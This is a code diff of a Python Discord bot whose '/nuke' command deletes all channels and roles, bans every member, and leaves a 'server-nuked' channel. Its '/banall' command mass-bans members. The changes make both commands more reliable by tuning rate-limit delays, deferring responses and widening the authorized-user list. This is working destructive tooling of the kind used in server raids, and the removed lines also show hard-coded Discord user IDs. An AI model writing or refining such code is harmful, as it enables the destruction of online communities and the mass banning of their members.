@@ -43,8 +43,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f"Bot logged in as {bot.user}")
-
+    print(f"✅ Bot logged in as {bot.user}")
     try:
         synced = await bot.sync_application_commands()
         print(f"Slash commands synced: {len(synced)}")
@@ -52,7 +51,7 @@ async def on_ready():
         print("Slash command sync error:", e)
 
 # ----------------------
-# CONFIRMATION BUTTON VIEW
+# CONFIRMATION VIEW (for /nuke)
 # ----------------------
 class ConfirmNuke(View):
     def __init__(self, user_id):
@@ -87,8 +86,9 @@ class ConfirmNuke(View):
 # ----------------------
 @bot.slash_command(name="nuke", description="Deletes all channels, roles, and bans everyone.")
 async def nuke(interaction: Interaction):
-    # Check if authorized user
-    if interaction.user.id != AUTHORIZED_USER:
+
+    # Authorization check
+    if interaction.user.id not in AUTHORIZED_USERS:
         await interaction.response.send_message("❌ You cannot use this command.", ephemeral=True)
         return
 
@@ -102,30 +102,24 @@ async def nuke(interaction: Interaction):
 
     await view.wait()
     if not view.result:
-        await interaction.followup.send("Nuke cancelled.", ephemeral=True)
+        await interaction.followup.send("❌ Nuke cancelled.", ephemeral=True)
         return
 
     guild = interaction.guild
     bot_member = guild.get_member(bot.user.id)
 
-    # ----------------------
     # DELETE CHANNELS
-    # ----------------------
     for channel in list(guild.channels):
         try:
             await channel.delete(reason="Nuked")
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.25)
         except Exception as e:
             print(f"Failed to delete channel {channel.name}: {e}")
 
-    # ----------------------
     # DELETE ROLES
-    # ----------------------
     for role in list(guild.roles):
         try:
-            if role.is_default():
-                continue
-            if role.managed:
+            if role.is_default() or role.managed:
                 continue
             if role.position >= bot_member.top_role.position:
                 continue
@@ -134,24 +128,19 @@ async def nuke(interaction: Interaction):
         except Exception as e:
             print(f"Failed to delete role {role.name}: {e}")
 
-    # ----------------------
-    # BAN MEMBERS  (FIXED)
-    # ----------------------
+    # BAN MEMBERS
     failed_bans = []
-
     for member in list(guild.members):
         try:
-            if member.id == AUTHORIZED_USER or member.id == bot.user.id:
+            if member.id in AUTHORIZED_USERS or member.id == bot.user.id:
                 continue
             await guild.ban(member, reason="Nuked", delete_message_days=0)
-            await asyncio.sleep(0.25)
+            await asyncio.sleep(0.3)
         except Exception as e:
-            print(f"Failed to ban {member} ({member.id}): {e}")
             failed_bans.append(f"{member} ({member.id})")
+            print(f"Failed to ban {member}: {e}")
 
-    # ----------------------
-    # Create final channel
-    # ----------------------
+    # FINAL CHANNEL MESSAGE
     try:
         ch = await guild.create_text_channel("server-nuked")
         msg = "💥 Server nuked successfully."
@@ -162,44 +151,42 @@ async def nuke(interaction: Interaction):
         print(f"Failed to create final channel: {e}")
 
     await interaction.followup.send("🔥 Nuke completed.", ephemeral=True)
-    
+
 # ---------------------------
-# Slash Command: /banall
+# /BANALL COMMAND
 # ---------------------------
 @bot.slash_command(
     name="banall",
-    description="Ban all server members (except you)."
+    description="Ban all server members (except you and authorized users)."
 )
 async def banall(interaction: nextcord.Interaction):
 
     # Authorization check
-    AUTHORIZED_USERS = [
-        1355140133661184221,  # you
-        1443180340012257313,  # friend 2
-    ]
-
     if interaction.user.id not in AUTHORIZED_USERS:
         await interaction.response.send_message(
             "You are not allowed to use this command.", ephemeral=True
         )
         return
 
-    await interaction.response.send_message("Mass ban started...", ephemeral=True)
+    # Prevent timeout
+    await interaction.response.defer(ephemeral=True)
 
     guild = interaction.guild
+    failed = 0
 
     for member in guild.members:
-        # Skip you + bots
-        if member.id == 1355140133661184221 or member.bot:
+        if member.id in AUTHORIZED_USERS or member.bot:
             continue
         try:
             await member.ban(reason="Mass ban command used.")
-            await asyncio.sleep(1)  # prevent rate-limit
-        except:
-            pass
+            await asyncio.sleep(1)  # rate-limit protection
+        except Exception as e:
+            failed += 1
+            print(f"Failed to ban {member}: {e}")
 
-    await interaction.followup.send("Mass ban complete.")
-
+    await interaction.followup.send(
+        f"✅ Mass ban complete. Failed: {failed}", ephemeral=True
+    )
 
 # ----------------------
 # RUN BOT
